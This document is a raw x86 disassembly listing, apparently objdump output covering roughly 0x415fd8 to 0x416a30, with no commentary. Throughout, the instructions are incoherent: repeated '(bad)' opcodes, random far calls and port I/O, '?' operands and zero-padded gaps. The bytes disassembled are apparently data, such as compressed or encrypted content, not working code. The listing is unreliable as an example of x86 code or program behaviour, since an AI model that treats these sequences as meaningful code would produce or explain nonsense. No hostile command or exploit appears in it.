  415fd8:	xor    DWORD PTR [ebx+ecx*2+0x3d],eax
  415fdc:	ret    0xc3ca
  415fdf:	(bad)  [edi-0x3d136f9d]
  415fe5:	test   edi,0x9361e514
  415feb:	sbb    ch,BYTE PTR [ebx]
  415fed:	aas    
  415fee:	pop    esp
  415fef:	xchg   esi,eax
  415ff0:	in     eax,0xf9
  415ff2:	gs aad 0xfd
  415ff5:	imul   edi,DWORD PTR [eax-0x52438e2a],0xa09211a0
  415fff:	xchg   ecx,eax
  416000:	das    
  416001:	out    0x1a,al
  416003:	adc    esi,DWORD PTR [ecx]
  416005:	xlat   BYTE PTR ds:[ebx]
  416006:	and    al,0xde
  416008:	adc    eax,0x5ae4b2ba
  41600d:	mov    edi,0x4ee630c5
  416012:	cmc    
  416013:	jle    0x41605c
  416015:	mov    edx,0x133e9554
  41601a:	jmp    0x416033
  41601c:	cmp    al,0x7b
  41601e:	retf   
  41601f:	add    dh,BYTE PTR [eax]
  416021:	push   esi
  416022:	fdivr  DWORD PTR [ebp+esi*4+0x1008552b]
  416029:	mov    edx,0x835b6d3b
  41602e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41602f:	stos   BYTE PTR es:[edi],al
  416030:	cmp    al,0xda
  416032:	and    al,0xb4
  416034:	xor    bl,BYTE PTR [ebx]
  416036:	push   edx
  416037:	xlat   BYTE PTR ds:[ebx]
  416038:	sti    
  416039:	ja     0x416069
  41603b:	int    0xb
  41603d:	in     eax,0xd8
  41603f:	sti    
  416040:	mov    cl,BYTE PTR [edi+0x2d]
  416043:	inc    esi
  416044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416045:	(bad)  
  416046:	jge    0x415fff
  416048:	ret    0x4484
  41604b:	fnstcw WORD PTR [ecx]
  41604d:	retf   
  41604e:	inc    edx
  41604f:	int3   
  416050:	xchg   ecx,eax
  416051:	dec    edi
  416052:	and    al,0xfa
  416054:	and    ch,BYTE PTR [eax+0x25]
  416057:	push   ecx
  416058:	into   
  416059:	addr16 mov ebx,0x31a83349
  41605f:	fisubr WORD PTR [esi]
  416061:	dec    ecx
  416062:	push   es
  416063:	jecxz  0x416080
  416065:	pop    ebp
  416066:	mov    ah,0xf5
  416068:	sbb    ebx,DWORD PTR ds:[eax+0x72842391]
  41606f:	jl     0x4160db
  416071:	sbb    eax,0x800460ab
  416076:	xchg   ebp,eax
  416077:	in     eax,0x96
  416079:	pop    esp
  41607a:	cs push ecx
  41607c:	xchg   ecx,eax
  41607d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41607e:	bound  esp,QWORD PTR [esi-0x70]
  416081:	lea    ecx,[esi-0x2bf224c2]
  416087:	jl     0x4160cb
  416089:	jmp    0x416029
  41608b:	inc    ebx
  41608c:	jl     0x4160dc
  41608e:	add    DWORD PTR [ebx-0x6bfba69f],ebp
  416094:	in     al,0x60
  416096:	leave  
  416097:	pop    edi
  416098:	mov    ch,0xdc
  41609a:	or     al,0xba
  41609c:	data16 je 0x4160c4
  41609f:	jo     0x416059
  4160a1:	scas   al,BYTE PTR es:[edi]
  4160a2:	mov    ebx,DWORD PTR [edi-0x4541e02e]
  4160a8:	addr16 out dx,al
  4160aa:	pop    esi
  4160ab:	jmp    0x2da4324d
  4160b0:	test   BYTE PTR [ebx],cl
  4160b2:	inc    edi
  4160b3:	or     BYTE PTR [eax+eax*1+0x0],bh
	...
  416113:	add    BYTE PTR [eax],al
  416115:	add    BYTE PTR [eax],ah
  416117:	jmp    0xdf3d3f57
  41611c:	in     eax,0xff
  41611e:	and    bl,BYTE PTR [ebx-0x78dcee79]
  416124:	push   ebx
  416125:	ror    BYTE PTR [esi+0x70000e6],1
  41612b:	add    DWORD PTR [eax],eax
  41612d:	add    BYTE PTR [ebx+esi*1],bl
  416130:	push   0x4d
  416132:	xchg   esi,eax
  416133:	mov    esi,0xcd82f284
  416138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416139:	cmp    edi,DWORD PTR [eax]
  41613b:	inc    edi
  41613c:	inc    esi
  41613d:	adc    cl,bl
  41613f:	mov    ebp,ss
  416141:	lods   eax,DWORD PTR ds:[esi]
  416142:	mov    esp,0x85fea7ec
  416147:	lock test BYTE PTR [ebx-0x5],0x35
  41614c:	adc    esp,0x618e2cee
  416152:	fild   WORD PTR [ebp+0x13ffc452]
  416158:	mov    WORD PTR [eax+0x5aed7da7],ss
  41615e:	add    eax,0xf3ee0688
  416163:	ins    BYTE PTR es:[edi],dx
  416164:	inc    ecx
  416165:	mov    gs,ebx
  416167:	push   ds
  416168:	pop    esp
  416169:	sti    
  41616a:	inc    ebx
  41616b:	clc    
  41616c:	inc    eax
  41616d:	std    
  41616e:	and    esp,edx
  416170:	fidivr WORD PTR [esi-0x4d1cce0b]
  416176:	loope  0x41615a
  416178:	retf   0x47c1
  41617b:	ret    
  41617c:	stos   BYTE PTR es:[edi],al
  41617d:	dec    edx
  41617e:	call   0x2349beeb
  416183:	and    DWORD PTR [ebx+0x66],edx
  416186:	and    al,0x7d
  416188:	adc    al,0x80
  41618a:	lods   eax,DWORD PTR ds:[esi]
  41618b:	mov    edx,0xcef21df
  416190:	(bad)  
  416192:	push   cs
  416193:	(bad)  [eax]
  416195:	call   0xaeeb:0xf3f46864
  41619c:	leave  
  41619d:	sbb    al,0xe
  4161a0:	pop    edi
  4161a1:	jno    0x416213
  4161a3:	cli    
  4161a4:	outs   dx,BYTE PTR ds:[esi]
  4161a5:	icebp  
  4161a6:	es dec ebp
  4161a8:	ror    BYTE PTR [eax+0x4142474e],1
  4161ae:	(bad)  
  4161af:	ins    DWORD PTR es:[edi],dx
  4161b0:	lds    eax,FWORD PTR [ebp+ebx*1-0x749ac022]
  4161b7:	retf   0xf870
  4161ba:	xor    eax,0xf08e6a3f
  4161bf:	call   DWORD PTR [edi+0x2b]
  4161c2:	push   ebx
  4161c3:	push   es
  4161c4:	add    DWORD PTR [esi+0x6e],edx
  4161c7:	xor    ebx,DWORD PTR [esi-0x6d7326f6]
  4161cd:	loope  0x4161f4
  4161cf:	sbb    eax,0x6c90fca7
  4161d4:	pop    eax
  4161d5:	call   0x1de3:0x8aeec318
  4161dc:	sbb    al,0xaf
  4161de:	out    dx,eax
  4161df:	(bad)  
  4161e0:	out    dx,eax
  4161e1:	fiadd  DWORD PTR [ebx]
  4161e3:	xchg   ecx,eax
  4161e4:	xor    BYTE PTR [edx+edi*1+0x408c64a],bl
  4161eb:	mov    al,0x67
  4161ed:	jmp    0x41623a
  4161ef:	mov    al,ds:0xcc66ccb
  4161f4:	stos   BYTE PTR es:[edi],al
  4161f5:	and    DWORD PTR [eax+ebp*1],ebx
  4161f8:	cli    
  4161f9:	hlt    
  4161fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161fb:	and    esi,DWORD PTR [esi]
  4161fd:	loopne 0x4161b1
  4161ff:	in     al,0xa
  416201:	pop    ds
  416202:	icebp  
  416203:	push   0xe4375d0f
  416208:	js     0x416227
  41620a:	aad    0x2e
  41620c:	mov    WORD PTR [eax+0x31],ss
  41620f:	mov    ds:0x9123808e,eax
  416214:	es mov ah,0x8f
  416217:	jnp    0x41628c
  416219:	pop    ss
  41621a:	mov    BYTE PTR [eax],ch
  41621c:	jecxz  0x41623a
  41621e:	aaa    
  41621f:	aaa    
  416220:	jecxz  0x416210
  416222:	dec    ebx
  416223:	sbb    bl,bh
  416225:	jl     0x4162a0
  416227:	call   0xf38c:0x6cc828d1
  41622e:	hlt    
  41622f:	test   eax,0xde13f605
  416234:	popa   
	...
  416295:	add    BYTE PTR [ebx],ah
  416297:	outs   dx,BYTE PTR ds:[esi]
  416298:	xor    ah,BYTE PTR ds:0x6e377d7f
  41629e:	test   BYTE PTR [esi+0x556f6de],bh
  4162a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162a5:	aam    0x95
  4162a7:	out    0x0,eax
  4162a9:	add    BYTE PTR [edi],al
  4162ab:	add    DWORD PTR [eax],eax
  4162ad:	add    BYTE PTR [edi+0x41a00b6e],dl
  4162b3:	sbb    DWORD PTR [esi+0x5b],esp
  4162b6:	adc    esp,DWORD PTR [eax+0x13914047]
  4162bc:	pop    ebx
  4162bd:	enter  0x51ff,0x1b
  4162c1:	cmp    esp,0xe64594b0
  4162c7:	cld    
  4162c8:	shl    BYTE PTR [edx],1
  4162ca:	popa   
  4162cb:	fwait
  4162cc:	es stos BYTE PTR es:[edi],al
  4162ce:	push   esp
  4162cf:	sbb    al,BYTE PTR [eax+0xb]
  4162d2:	push   ecx
  4162d3:	ret    
  4162d4:	cmp    al,0xd0
  4162d6:	stc    
  4162d7:	lahf   
  4162d8:	je     0x4162f2
  4162da:	lods   eax,DWORD PTR ds:[esi]
  4162db:	push   ecx
  4162dc:	pop    edi
  4162dd:	in     eax,0x5e
  4162df:	xchg   edi,eax
  4162e0:	aaa    
  4162e1:	je     0x416352
  4162e3:	aam    0xd3
  4162e5:	xchg   ebp,eax
  4162e6:	jge    0x4162da
  4162e8:	jle    0x416346
  4162ea:	fsubr  st,st(7)
  4162ec:	add    edx,edi
  4162ee:	mov    BYTE PTR [ebx-0x6e],0xd7
  4162f2:	mov    dl,0xa0
  4162f4:	jae    0x4162fe
  4162f6:	ss clc 
  4162f8:	mov    dh,0xe6
  4162fa:	xlat   BYTE PTR ds:[ebx]
  4162fb:	std    
  4162fc:	dec    ebx
  4162fd:	mov    al,ds:0x7108c4b1
  416302:	ret    0xe9bc
  416305:	push   cs
  416306:	dec    ebp
  416307:	cdq    
  416308:	adc    ebp,DWORD PTR [edx]
  41630a:	xchg   ecx,eax
  41630b:	daa    
  41630c:	dec    esp
  41630d:	ffreep st(5)
  41630f:	add    BYTE PTR [ebx+0x6],ah
  416312:	jb     0x416361
  416314:	adc    ah,dl
  416316:	cmc    
  416317:	mov    ebx,0xec3dabd5
  41631c:	dec    ebp
  41631d:	(bad)  
  41631e:	mov    bh,0x42
  416320:	sbb    cl,BYTE PTR [ebp+0x26]
  416323:	sahf   
  416324:	hlt    
  416325:	add    al,0x44
  416327:	cmp    esp,DWORD PTR [edi-0x66]
  41632a:	pusha  
  41632b:	shl    al,1
  41632d:	push   eax
  41632e:	mov    BYTE PTR [eax],bl
  416330:	repz bound ecx,QWORD PTR [edi-0x59]
  416334:	adc    BYTE PTR [ebp+0x5c],dl
  416337:	push   ebx
  416338:	leave  
  416339:	add    BYTE PTR [eax-0x40701de],dl
  41633f:	sub    al,0x86
  416341:	adc    DWORD PTR [ebp+edi*8-0xe],ebp
  416345:	pushf  
  416346:	mov    bl,0x37
  416348:	or     ch,BYTE PTR [esi+0x45]
  41634b:	xchg   edx,eax
  41634c:	mov    ds:0x965643eb,al
  416351:	inc    esp
  416352:	mov    ecx,0x27a2984f
  416357:	mov    edi,esp
  416359:	mov    ebx,0x9a79b72f
  41635e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41635f:	pop    es
  416360:	aad    0xe9
  416362:	jle    0x41631a
  416364:	test   BYTE PTR [eax-0x5fe257cf],dh
  41636a:	call   0x5089:0x566b3fcf
  416371:	js     0x41631e
  416373:	in     al,dx
  416374:	add    eax,0x382fe5c0
  416379:	or     eax,0x6e2a1c4e
  41637e:	and    BYTE PTR [edx+0xa],dh
  416381:	jo     0x4163f5
  416383:	pop    edi
  416384:	stc    
  416385:	cld    
  416386:	ret    0xbfeb
  416389:	int3   
  41638a:	and    dl,BYTE PTR [edx+0x4156e772]
  416390:	test   DWORD PTR [ecx+0x277c2651],edi
  416396:	add    BYTE PTR [edx-0x16],0x79
  41639a:	jl     0x41634b
  41639c:	sub    ch,bl
  41639e:	xor    al,BYTE PTR [ebp+ebp*4-0xdbde7fb]
  4163a5:	sti    
  4163a6:	test   eax,0x987d720f
  4163ab:	sti    
  4163ac:	loopne 0x416422
  4163ae:	pusha  
  4163af:	mov    edi,0xd3391c87
  4163b4:	mov    esp,0x0
	...
  416415:	add    bl,dh
  416417:	inc    ebx
  416418:	ror    cl,1
  41641a:	lock (bad) 
  41641d:	jnp    0x416481
  41641f:	xchg   esi,eax
  416420:	cmp    DWORD PTR [ebp-0x2cb8a633],edx
  416426:	pushf  
  416427:	call   0x148642c
  41642c:	add    BYTE PTR [eax],al
  41642e:	and    ebp,ebx
  416430:	sbb    al,ch
  416432:	enter  0x473f,0x62
  416436:	push   ecx
  416437:	mov    eax,ds:0x6ad61c95
  41643c:	push   ss
  41643d:	pusha  
  41643e:	and    ch,BYTE PTR [ebx+edi*1-0x67]
  416442:	lea    edx,[ecx+0x5c]
  416445:	jecxz  0x4163ed
  416447:	push   esp
  416448:	and    DWORD PTR [ecx],edx
  41644a:	imul   edx,esp,0xffffffb5
  41644d:	jno    0x41645e
  41644f:	pop    ecx
  416450:	sub    bl,BYTE PTR [eax+0x30]
  416453:	push   edx
  416454:	jmp    0xa6aed6b8
  416459:	in     al,0xf6
  41645b:	dec    ecx
  41645c:	sub    al,0x42
  41645e:	outs   dx,BYTE PTR ds:[esi]
  41645f:	out    dx,eax
  416460:	mov    ds:0xbca797f7,eax
  416465:	sub    ch,bh
  416467:	jp     0x4163ee
  416469:	outs   dx,DWORD PTR ds:[esi]
  41646a:	pop    ss
  41646b:	sub    esp,edi
  41646d:	enter  0x55e,0x2c
  416471:	push   cs
  416472:	fild   DWORD PTR [edx]
  416474:	sbb    eax,0x43097478
  416479:	or     ecx,ebp
  41647b:	bound  ebp,QWORD PTR [eax-0x65]
  41647e:	mov    bh,0xbf
  416480:	xor    esi,DWORD PTR [esi+0x3e]
  416483:	mov    ch,BYTE PTR [edi]
  416485:	xor    esi,esp
  416487:	jmp    0x4164f6
  416489:	cmp    eax,0xf207e295
  41648e:	outs   dx,BYTE PTR ds:[esi]
  41648f:	fisub  DWORD PTR [edx]
  416491:	cmp    DWORD PTR [ebx+0x59700042],esi
  416497:	stos   BYTE PTR es:[edi],al
  416498:	mov    eax,0x9ac2c48e
  41649d:	pop    ebx
  41649e:	or     cl,BYTE PTR [edi]
  4164a0:	jmp    0x416496
  4164a2:	in     eax,dx
  4164a3:	in     eax,dx
  4164a4:	pop    eax
  4164a5:	int    0x5c
  4164a7:	call   0x3abc0226
  4164ac:	lods   eax,DWORD PTR ds:[esi]
  4164ad:	mov    ch,0x85
  4164af:	(bad)  
  4164b1:	mov    ch,bl
  4164b3:	adc    eax,0x78b0f354
  4164b8:	xor    ebp,DWORD PTR [edi-0xc]
  4164bb:	inc    bl
  4164bd:	aad    0x10
  4164bf:	xor    al,0x19
  4164c1:	push   edx
  4164c2:	mov    ebp,0xecf5a8ae
  4164c7:	ficomp WORD PTR ds:[ebp-0x1e952e02]
  4164ce:	xchg   ebx,eax
  4164cf:	inc    ecx
  4164d0:	popa   
  4164d1:	nop
  4164d2:	ret    0x815d
  4164d5:	cmc    
  4164d6:	mov    ecx,0x4aff99b0
  4164db:	test   DWORD PTR [ebp+0x1],0x5fc35a13
  4164e2:	cli    
  4164e3:	xchg   DWORD PTR [esi],edi
  4164e5:	dec    edx
  4164e6:	push   eax
  4164e7:	mov    gs,WORD PTR [eax+0x52]
  4164ea:	add    edx,DWORD PTR [ecx]
  4164ec:	jno    0x416479
  4164ee:	pushf  
  4164ef:	jbe    0x41653c
  4164f1:	repnz add ch,ch
  4164f4:	shl    BYTE PTR [edi],0x71
  4164f7:	test   DWORD PTR [edx+0x6166d1c8],esp
  4164fd:	mov    fs,WORD PTR [ebx]
  4164ff:	loope  0x4164f7
  416501:	push   es
  416502:	push   esi
  416503:	into   
  416504:	sbb    cl,dl
  416506:	(bad)  
  416507:	sar    BYTE PTR [edi-0x4b],cl
  41650a:	and    DWORD PTR [edx+ebp*1],ebp
  41650d:	leave  
  41650e:	out    dx,eax
  41650f:	aad    0x89
  416511:	xchg   esp,eax
  416512:	cmp    BYTE PTR [edx+edx*1],ah
  416515:	pop    eax
  416516:	mov    ds:0x45faaecd,eax
  41651b:	pop    ebx
  41651c:	add    BYTE PTR [ecx],bl
  41651e:	dec    esp
  41651f:	mov    esi,edi
  416521:	iret   
  416522:	lock out 0xf0,al
  416525:	js     0x4164af
  416527:	or     ah,BYTE PTR [ecx-0x76]
  41652a:	loope  0x4164f2
  41652c:	dec    ebx
  41652d:	div    DWORD PTR [edx]
  41652f:	jo     0x4164b4
  416531:	xor    BYTE PTR [eax+0x9c90],0x0
	...
  416594:	add    BYTE PTR [eax],al
  416596:	and    eax,0xfff32bd8
  41659b:	repz std 
  41659d:	fisubr WORD PTR [edi+ebp*1+0x72]
  4165a1:	jno    0x4165a9
  4165a3:	push   ecx
  4165a4:	adc    cl,BYTE PTR [edi-0x5d]
  4165a7:	jmp    0x14865ac
  4165ac:	add    BYTE PTR [eax],al
  4165ae:	dec    esi
  4165af:	rcr    eax,1
  4165b1:	das    
  4165b2:	pop    edi
  4165b3:	cmp    BYTE PTR [eax-0x20526545],cl
  4165b9:	cmc    
  4165ba:	sub    ecx,eax
  4165bc:	or     ah,dl
  4165be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165bf:	mov    edi,0xe3fee92c
  4165c4:	sar    BYTE PTR ds:0x975415b4,cl
  4165ca:	lea    edx,ds:0x5b969bde
  4165d0:	push   ds
  4165d1:	icebp  
  4165d2:	fwait
  4165d3:	mov    BYTE PTR [ebx+0x2f],cl
  4165d6:	aam    0x8c
  4165d8:	call   0x9d57:0x81de744d
  4165df:	aam    0x3c
  4165e1:	mov    cl,0x64
  4165e3:	ret    0xd0ec
  4165e6:	mov    ?,WORD PTR [eax]
  4165e8:	out    0xfe,al
  4165ea:	sub    BYTE PTR [edi],bh
  4165ec:	mul    BYTE PTR ds:0x7aa55ef9
  4165f2:	xchg   edx,eax
  4165f3:	loopne 0x41660b
  4165f5:	jae    0x41665f
  4165f7:	xchg   edx,eax
  4165f8:	clc    
  4165f9:	or     esi,0x60ff3b27
  4165ff:	ror    cl,1
  416601:	sbb    al,BYTE PTR ds:0x12a0913e
  416607:	dec    cx
  416609:	sar    BYTE PTR [eax-0x6f],cl
  41660c:	mov    ebx,0xa3269805
  416611:	inc    eax
  416612:	scas   eax,DWORD PTR es:[edi]
  416613:	pop    ebx
  416614:	pop    edx
  416615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416616:	scas   al,BYTE PTR es:[edi]
  416617:	stc    
  416618:	and    al,0x40
  41661a:	xor    BYTE PTR [ecx-0x7849cdd],0xe5
  416621:	cli    
  416622:	stos   BYTE PTR es:[edi],al
  416623:	add    BYTE PTR [eax],0xbb
  416626:	pop    edx
  416627:	mov    ecx,0x68a6488c
  41662c:	cmp    eax,DWORD PTR [ebx-0x53]
  41662f:	pop    ebp
  416630:	xchg   DWORD PTR [esi-0x74],ecx
  416633:	lea    ecx,[eax]
  416635:	push   cs
  416636:	pop    ds
  416637:	dec    ecx
  416638:	xchg   ecx,eax
  416639:	and    ecx,DWORD PTR [edx+0x43361519]
  41663f:	xchg   ah,bh
  416641:	and    ah,BYTE PTR es:[edx+0x6fdbdb14]
  416648:	sbb    DWORD PTR [eax+0x31],0x62
  41664c:	mov    gs:0x67c9e57,al
  416652:	xor    DWORD PTR [edx+0x6d],ecx
  416655:	ins    BYTE PTR es:[edi],dx
  416656:	ins    DWORD PTR es:[edi],dx
  416657:	fs pop eax
  416659:	leave  
  41665a:	mov    ecx,0x5aa1f178
  41665f:	in     al,0x8c
  416661:	add    esp,ecx
  416663:	jb     0x4166be
  416665:	fdivr  DWORD PTR [esi]
  416667:	inc    edx
  416668:	ins    DWORD PTR es:[edi],dx
  416669:	int    0xa6
  41666b:	mov    esp,0xdb8da846
  416670:	ret    0xf0fb
  416673:	jp     0x416685
  416675:	daa    
  416676:	pop    ds
  416677:	imul   DWORD PTR [eax]
  416679:	xor    al,0x1f
  41667b:	xchg   ebp,eax
  41667c:	mov    cl,0x79
  41667e:	rcr    BYTE PTR [edx-0x48f01045],cl
  416684:	and    ebx,ebp
  416686:	clc    
  416687:	sub    bh,BYTE PTR [ecx+0x4efed5de]
  41668d:	addr16 jns 0x416670
  416690:	popf   
  416691:	mov    ?,WORD PTR [edi+esi*4]
  416694:	push   ebp
  416695:	cdq    
  416696:	(bad)  
  416697:	mov    ebp,0xdb720c3b
  41669c:	or     eax,0x62062720
  4166a1:	outs   dx,BYTE PTR ds:[esi]
  4166a2:	pop    esp
  4166a3:	test   al,0x4b
  4166a5:	push   ss
  4166a6:	ror    BYTE PTR [ebx-0x2e],1
  4166a9:	popa   
  4166aa:	(bad)  
  4166ab:	call   0xf8f1:0x564a2307
  4166b2:	in     eax,dx
  4166b3:	ins    BYTE PTR es:[edi],dx
  4166b4:	mov    ebx,0x0
	...
  416715:	add    ah,al
  416717:	(bad)  
  416719:	(bad)  
  41671a:	(bad)  
  41671c:	out    0xff,eax
  41671e:	mov    ah,0x10
  416720:	mov    cl,0x4f
  416722:	sub    eax,DWORD PTR ds:0xeaaaef75
  416728:	add    BYTE PTR [eax],al
  41672a:	pop    es
  41672b:	add    DWORD PTR [eax],eax
  41672d:	add    BYTE PTR [ebx+0x73d93409],dh
  416733:	dec    ecx
  416734:	push   ebx
  416735:	sti    
  416736:	repnz xchg dx,ax
  416739:	mov    bl,al
  41673b:	test   BYTE PTR ds:0x3c2c9d23,ch
  416741:	out    dx,eax
  416742:	mov    ?,WORD PTR [eax+0x7b]
  416745:	sub    BYTE PTR [ecx],ah
  416747:	mov    ecx,0xb415654a
  41674c:	inc    esp
  41674d:	jl     0x4166d0
  41674f:	jbe    0x41674d
  416751:	cmp    eax,0x564e8987
  416756:	adc    bl,BYTE PTR [ebx-0x2cf2efe]
  41675c:	clc    
  41675d:	xor    al,0x41
  41675f:	pop    esp
  416760:	icebp  
  416761:	cmp    al,0x2f
  416763:	arpl   WORD PTR [edi-0x14fefab2],sp
  416769:	add    ecx,edi
  41676b:	pusha  
  41676c:	cli    
  41676d:	cli    
  41676e:	cwde   
  41676f:	jl     0x41670c
  416771:	jno    0x4167e6
  416773:	and    ebx,DWORD PTR [esi-0x64]
  416776:	dec    esi
  416777:	mov    DWORD PTR [ecx],esp
  416779:	test   al,0x4c
  41677b:	inc    ebp
  41677c:	xchg   esp,eax
  41677d:	in     al,0x41
  41677f:	cld    
  416780:	add    bl,BYTE PTR [eax+edi*1-0x4ef65806]
  416787:	add    eax,0x7558a3d1
  41678c:	xchg   edx,eax
  41678d:	call   0x570f:0x42ec1e40
  416794:	ins    DWORD PTR es:[edi],dx
  416795:	jnp    0x41674b
  416797:	dec    esi
  416798:	dec    ecx
  416799:	in     al,dx
  41679a:	loope  0x4167d5
  41679c:	xor    DWORD PTR ds:0x533b50e0,eax
  4167a2:	mov    ah,0xb9
  4167a4:	lods   eax,DWORD PTR ds:[esi]
  4167a5:	jae    0x41678c
  4167a7:	int    0x3b
  4167a9:	ror    ecx,cl
  4167ab:	xchg   edi,eax
  4167ac:	jg     0x4167d3
  4167ae:	shl    dl,cl
  4167b0:	sub    BYTE PTR ds:0x1989c711,al
  4167b6:	les    ecx,FWORD PTR [edi+0x24]
  4167b9:	add    ebx,DWORD PTR [ebp+0xda3620a]
  4167bf:	out    0x8e,eax
  4167c1:	loopne 0x4167b1
  4167c3:	adc    BYTE PTR [eax-0xe],bh
  4167c6:	mov    esi,0x57af853a
  4167cb:	inc    ebx
  4167cc:	mov    al,ds:0x1741c939
  4167d1:	add    BYTE PTR ds:0xed84a79c,dl
  4167d7:	stc    
  4167d8:	icebp  
  4167d9:	inc    ebx
  4167da:	das    
  4167db:	mov    al,BYTE PTR [edi]
  4167dd:	std    
  4167de:	cmp    al,0xd9
  4167e0:	dec    ebp
  4167e1:	out    0xad,al
  4167e3:	push   ds
  4167e4:	int    0x56
  4167e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167e7:	or     dl,BYTE PTR [esi+edx*2]
  4167ea:	sbb    eax,0xef3c41c7
  4167ef:	dec    edx
  4167f0:	or     eax,0xd8a72bc4
  4167f5:	mov    bh,0x20
  4167f7:	and    ah,bl
  4167f9:	std    
  4167fa:	rcr    ebp,1
  4167fc:	push   esi
  4167fd:	mov    dl,0x11
  4167ff:	cmc    
  416800:	dec    edi
  416801:	cmp    ecx,esi
  416803:	es or  eax,ecx
  416806:	call   0x912ebc1b
  41680b:	mov    esp,DWORD PTR [esi+0x2a]
  41680e:	add    DWORD PTR [ecx+0x6f],ecx
  416811:	ss sti 
  416813:	sbb    al,0x78
  416815:	stc    
  416816:	pusha  
  416817:	pop    ebx
  416818:	jb     0x4167e3
  41681a:	cmp    al,0x26
  41681c:	fld    DWORD PTR [ebp-0x7a]
  41681f:	lock data16 fisub DWORD PTR [ecx]
  416823:	xor    eax,0x8c4166b6
  416828:	cmp    ch,BYTE PTR [edx+0x6caec613]
  41682e:	aaa    
  41682f:	adc    BYTE PTR [eax+0x44],bl
  416832:	shl    BYTE PTR [esi-0x28],cl
	...
  416895:	add    cl,dl
  416897:	scas   eax,DWORD PTR es:[edi]
  416898:	push   es
  416899:	repz jle 0x416897
  41689c:	cmc    
  41689d:	scas   eax,DWORD PTR es:[edi]
  41689e:	cwde   
  41689f:	sub    bh,al
  4168a1:	bnd jge 0x416873
  4168a4:	push   esp
  4168a5:	aaa    
  4168a6:	mov    cl,0xeb
  4168a8:	add    BYTE PTR [eax],al
  4168aa:	pop    es
  4168ab:	add    DWORD PTR [eax],eax
  4168ad:	add    BYTE PTR [edx],dh
  4168af:	cmp    al,0x88
  4168b1:	dec    eax
  4168b2:	loop   0x416894
  4168b4:	ja     0x41687a
  4168b6:	mov    ebp,0xe5c81624
  4168bb:	mov    bh,0x32
  4168bd:	frstor [edi+0xa3a7e99]
  4168c3:	mov    ebx,0x467fa51d
  4168c8:	leave  
  4168c9:	mov    ds:0xd40f4a38,eax
  4168ce:	and    eax,DWORD PTR [ebx]
  4168d0:	pop    esp
  4168d1:	pop    ebx
  4168d2:	dec    eax
  4168d3:	add    al,dl
  4168d5:	add    ebx,DWORD PTR [esi+0x5b]
  4168d8:	add    BYTE PTR cs:[ecx-0x5abfa1c7],dh
  4168df:	hlt    
  4168e0:	stos   BYTE PTR es:[edi],al
  4168e1:	jge    0x416915
  4168e3:	or     edx,DWORD PTR [ecx+0x3fece07e]
  4168e9:	imul   esp,DWORD PTR [ebx+0x64],0xffffffd4
  4168ed:	jnp    0x41695c
  4168ef:	xor    al,0xf8
  4168f1:	fwait
  4168f2:	cmc    
  4168f3:	or     dl,BYTE PTR [esp+esi*1]
  4168f6:	in     eax,0x44
  4168f8:	cmp    DWORD PTR [ebx],ebx
  4168fa:	cmp    DWORD PTR [ebp+0x4f],edi
  4168fd:	dec    ecx
  4168fe:	jmp    DWORD PTR [esi+0x6d628bb9]
  416904:	retf   0x4902
  416907:	(bad)  
  416908:	mov    esi,0xc21689d3
  41690d:	jle    0x41694d
  41690f:	sub    al,0x1f
  416911:	push   0x3d
  416913:	cmp    DWORD PTR [ebp-0x48],0xffffff99
  416917:	xor    BYTE PTR [eax-0x61285267],0x81
  41691e:	aam    0x80
  416920:	adc    DWORD PTR [eax],esp
  416922:	mov    esp,0x5d877c0f
  416927:	sub    al,0x12
  416929:	adc    al,0x1d
  41692b:	or     BYTE PTR [ebx+0x198da55c],ah
  416931:	mov    bl,0x18
  416933:	pop    ecx
  416934:	enter  0x6830,0xbe
  416938:	xlat   BYTE PTR ds:[ebx]
  416939:	xchg   ecx,eax
  41693a:	jmp    0x9fd9:0x8e95eb05
  416941:	aaa    
  416942:	mov    esi,DWORD PTR [eax]
  416944:	push   eax
  416945:	sub    al,0x58
  416947:	sub    BYTE PTR [esi+eiz*2+0x76e3c3bc],dl
  41694e:	push   es
  41694f:	ins    DWORD PTR es:[edi],dx
  416950:	shr    DWORD PTR [ebp-0x6d],1
  416953:	in     al,dx
  416954:	and    ch,BYTE PTR [edx+0xd]
  416957:	xchg   ebx,eax
  416958:	shr    DWORD PTR ds:0xabb0a3b6,cl
  41695e:	and    al,0x5
  416960:	mov    WORD PTR [edi],ss
  416962:	mov    dl,0xd1
  416964:	pop    ss
  416965:	mov    ah,BYTE PTR [edi-0x2]
  416968:	sub    DWORD PTR [edx],eax
  41696a:	outs   dx,BYTE PTR ds:[esi]
  41696b:	mov    esp,0xa202307a
  416970:	sub    al,0x8a
  416972:	aad    0x3e
  416974:	xchg   DWORD PTR [esi-0x25f9deaa],ebp
  41697a:	mov    edi,DWORD PTR [esi+edx*1-0x66]
  41697e:	pop    eax
  41697f:	sbb    eax,0xfe1b8dd9
  416984:	push   ebx
  416985:	stos   BYTE PTR es:[edi],al
  416986:	add    eax,0xc422455f
  41698b:	fisubr WORD PTR [eax-0x4fd5f916]
  416991:	fucomi st,st(7)
  416993:	pop    ss
  416994:	pop    esi
  416995:	rcr    ecx,1
  416997:	dec    esp
  416998:	jnp    0x4169a8
  41699a:	mov    edi,0xefd8e652
  41699f:	test   DWORD PTR [edi+0xfc8d486],ebx
  4169a5:	jge    0x4169ca
  4169a7:	mov    edi,0x79bea39c
  4169ac:	rcr    BYTE PTR [ebx+0x74a219cf],1
  4169b2:	cmc    
  4169b3:	lods   al,BYTE PTR ds:[esi]
  4169b4:	jmp    0x4169b6
	...
  416a16:	retf   
  416a17:	pusha  
  416a18:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a1e:	enter  0x4aea,0x13
  416a22:	inc    ebx
  416a23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a24:	sbb    BYTE PTR [esi-0x48],ah
  416a27:	in     al,dx
  416a28:	add    BYTE PTR [eax],al
  416a2a:	pop    es
  416a2b:	add    DWORD PTR [eax],eax
  416a2d:	add    BYTE PTR [edx-0x5b],dh
  416a30:	icebp  
